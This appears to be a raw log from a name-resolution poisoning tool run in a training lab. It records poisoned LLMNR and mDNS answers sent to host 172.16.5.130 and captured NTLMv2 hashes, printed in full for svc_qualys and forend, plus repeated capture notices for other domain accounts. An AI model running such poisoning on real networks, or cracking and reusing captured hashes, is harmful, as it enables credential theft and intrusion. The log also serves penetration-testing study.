+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:10 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:11 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:11 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:11 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:11 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:12 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:12 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:12 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:12 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:12 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:12 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:14 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:14 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:15 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:15 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:16 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:16 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:17 PM - [SMB] NTLMv2-SSP Client   : 172.16.5.130
+04/08/2026 04:10:17 PM - [SMB] NTLMv2-SSP Username : INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [SMB] NTLMv2-SSP Hash     : svc_qualys::INLANEFREIGHT:1462297b110a5156:378189F6CE2AF9AECF22B3CB5E9FE88C:0101000000000000807C3CF071C7DC0143DB50B529B6918B00000000020008004B0038003700530001001E00570049004E002D0052003000490057005900330042004A0031003700340004003400570049004E002D0052003000490057005900330042004A003100370034002E004B003800370053002E004C004F00430041004C00030014004B003800370053002E004C004F00430041004C00050014004B003800370053002E004C004F00430041004C0007000800807C3CF071C7DC01060004000200000008003000300000000000000000000000003000005731BC921595FE4A64EC590CF510B5CD77432252F256EEEE074407B565ACD6A10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:10:19 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:19 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:21 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:21 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:22 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:22 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:22 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:22 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:23 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:23 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:23 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:23 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:24 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:24 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:24 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:24 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:30 PM - [SMB] NTLMv2-SSP Client   : 172.16.5.130
+04/08/2026 04:10:30 PM - [SMB] NTLMv2-SSP Username : INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [SMB] NTLMv2-SSP Hash     : forend::INLANEFREIGHT:43f67254516328ff:C75BEAC3B2747CF2CC18FF76F82B1C35:0101000000000000807C3CF071C7DC01A78480C85FFBDAE900000000020008004B0038003700530001001E00570049004E002D0052003000490057005900330042004A0031003700340004003400570049004E002D0052003000490057005900330042004A003100370034002E004B003800370053002E004C004F00430041004C00030014004B003800370053002E004C004F00430041004C00050014004B003800370053002E004C004F00430041004C0007000800807C3CF071C7DC01060004000200000008003000300000000000000000000000003000005731BC921595FE4A64EC590CF510B5CD77432252F256EEEE074407B565ACD6A10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:10:32 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:32 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:33 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:33 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:34 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:34 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:06 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:06 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:07 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:07 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:13 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:13 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:14 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:14 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:14 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:14 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:15 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:15 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:15 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:15 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:15 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:15 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:16 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:16 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:17 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:17 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:17 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:17 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:20 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:11:21 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:21 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:25 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:25 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:26 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:26 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:26 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:26 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:27 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:27 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:27 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:27 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:28 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:28 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:28 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:28 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:38 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:38 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:39 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:11:39 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:11:40 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:40 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:11:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:12:08 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:08 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:09 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:09 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:12:16 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:16 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:16 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:16 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:17 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:17 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:17 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:17 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\svc_qualys
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:18 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:18 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:18 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:19 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:19 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:20 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:20 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:21 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:21 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:23 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:23 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:28 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:28 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:28 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:28 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:29 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:29 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:30 PM - [*] Skipping previously captured hash for INLANEFREIGHT\forend
+04/08/2026 04:12:32 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:32 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:33 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:12:33 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:12:34 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:12:34 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
